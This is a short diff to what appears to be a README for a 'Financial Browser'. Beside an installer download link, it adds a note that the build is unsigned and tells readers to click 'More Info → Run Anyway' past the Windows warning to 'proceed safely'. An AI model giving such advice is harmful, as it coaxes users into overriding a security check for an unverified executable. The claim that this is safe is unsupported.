@@ -55,7 +55,10 @@ Interested in testing the full browser experience?
 
 📦 [Download Financial Browser – Mini_Installer.exe](https://your-file-host.com/Mini_Installer.exe)
 
-> ⚠️ Installer is provided for demonstration purposes only. Full customization available on request.
+> 
+> ⚠️ This installer is provided for demonstration purposes only.  
+> 🔐 Since it is **not a signed build**, Windows may display a warning message during installation. You can choose “More Info → Run Anyway” to proceed safely.  
+
 
 
 ---
